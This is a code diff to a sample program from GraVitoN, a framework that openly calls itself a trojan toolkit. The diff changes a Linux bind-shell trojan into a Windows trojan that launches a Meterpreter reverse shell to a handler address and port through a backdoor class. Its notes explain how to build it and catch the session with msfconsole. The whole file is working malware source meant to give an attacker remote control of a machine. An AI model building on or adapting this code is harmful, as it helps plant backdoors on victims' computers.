@@ -1,5 +1,3 @@
-// ----> DO NOT FORGET TO DISABLE OPTIMIZATION FLAG
-
 /**
  * @file
  * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
@@ -21,8 +19,8 @@
  * You should have received a copy of the GNU General Public License
  * along with Graviton.  If not, see http://www.gnu.org/licenses/.
  *
- * @brief GraVitoN - Sample Linux64 Trojan
- * 
+ * @brief GraVitoN Sample Win32 Trojan
+ *
  * @section Note
  * 1. Disable g++ optimization (make <...> CPPFLAGS=-O0 |or| g++ <..> -O0) \n
  * 2. If you are using msfconsole/exploit/multi/handler, push Ctrl+Z in case of sending a session to background. \n
@@ -36,26 +34,32 @@
 /// Path to Log File
 //#define GVN_LOG_FILE "./graviton_logs.txt"
 
+#include <windows.h>
+
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 #include <graviton.hpp>
-#include <payload/linux/msf_shell_bind_64.hpp>
+// #include <payload/win/meterpreter_bind_32.hpp>
+#include <payload/win/meterpreter_reverse_32.hpp>
 #include <ai/backdoor_sample.hpp>
 #include <iostream>
 using namespace std;
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-int main()
+int WINAPI WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR cmd_line, int n_cmd)
+// int main()
 {
     GraVitoN::Core::Logger::logItLn ( "main -> Started" );
-	
-    GraVitoN::Payload::Linux_MSF_Shell_Bind_64 msfpay;
-    msfpay.initialize(7357);
+
+    // GraVitoN::Payload::Windows_MSF_Shell_Bind_32 msfpay;
+    // msfpay.initialize(7357);
+    GraVitoN::Payload::Windows_MSF_Shell_Reverse_32 msfpay;
+    msfpay.initialize("127.0.0.1", 7357);
 
     GraVitoN::AI::Backdoor_Sample backy(msfpay);
 
     backy.run();
-	
+
     GraVitoN::Core::Logger::logItLn ( "main -> done" );
-	
+
     return 0;
 }
